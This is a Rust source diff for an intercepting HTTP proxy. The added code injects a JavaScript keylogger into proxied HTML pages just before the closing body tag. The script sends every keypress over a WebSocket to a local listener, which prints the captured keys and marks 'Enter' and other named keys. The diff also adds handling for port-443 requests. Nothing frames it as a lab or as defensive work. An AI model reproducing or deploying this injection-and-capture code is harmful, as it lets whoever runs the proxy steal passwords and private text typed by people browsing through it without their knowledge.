@@ -1,4 +1,4 @@
-use hyper::{Body, Client, Request, Response, Server, header::{CONTENT_LENGTH, HeaderValue}, service::{make_service_fn, service_fn}};
+use hyper::{Body, Client, Method, Request, Response, Server, header::{CONTENT_LENGTH, HeaderValue}, service::{make_service_fn, service_fn}};
 use std::{net::TcpListener, thread::spawn};
 use tungstenite::accept;
 
@@ -25,7 +25,17 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
                 let msg = websocket.read_message().unwrap();
 
                 if msg.is_text() {
-                    println!("{}", msg.to_text().unwrap());
+                    let txt = msg.to_text().unwrap();
+
+                    if txt.len() > 1 {
+                        print!("<{}>", txt);
+                    } else {
+                        print!("{}", msg.to_text().unwrap());
+                    }
+
+                    if txt == "Enter" {
+                        println!();
+                    }
                 }
             }
         });
@@ -36,12 +46,64 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
 
 async fn respond(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
     let uri = req.uri();
-    // println!("{}", uri);
+
+    if let Some(auth) = uri.authority() {
+        if let Some(443) = auth.port_u16() {
+            return respond_https(req).await
+        }
+    }
+
     let client = Client::new();
 
-    let mut res = client.get(uri.clone()).await?;
+    let res = match *req.method() {
+        Method::GET => {
+            let mut res = client.get(uri.clone()).await?;
+        
+            if let Some(header) = res.headers().get("content-type") {
+                if header.to_str().unwrap() != "text/html" {
+                    return Ok(res)
+                }
+            } else {
+                let body = res.body_mut();
+        
+                let bytes = hyper::body::to_bytes(body).await?;
+                let mut body_str = String::from_utf8(bytes.into_iter().collect()).unwrap();
+        
+                match body_str.find("</body>") {
+                    Some(index) => {
+                        body_str.insert_str(index-1, r#"
+                            <script>
+                            (() => {
+                                const socket = new WebSocket("ws://localhost:8080");
+                                document.onkeydown = (e) => {
+                                    socket.send(e.key);
+                                    console.log(e);
+                                }
+                            })()
+                            </script>"#
+                        );
+                    },
+                    None => {}
+                }
+        
+                res.headers_mut().insert(CONTENT_LENGTH, HeaderValue::from(body_str.bytes().len()));
+                *res.body_mut() = Body::from(body_str);
+            }
+            res
+        },
+        _ => client.request(req).await?
+    };
 
-    // println!("{:?}", res.headers());
+
+    Ok(res)
+}
+
+async fn respond_https(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
+    let https = hyper_rustls::HttpsConnector::with_native_roots();
+    let client: Client<_, Body> = Client::builder().build(https);
+    let uri = req.uri();
+
+    let mut res = client.get(uri.clone()).await?;
 
     if let Some(header) = res.headers().get("content-type") {
         if header.to_str().unwrap() != "text/html" {
@@ -75,4 +137,5 @@ async fn respond(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
     }
 
     Ok(res)
+
 }
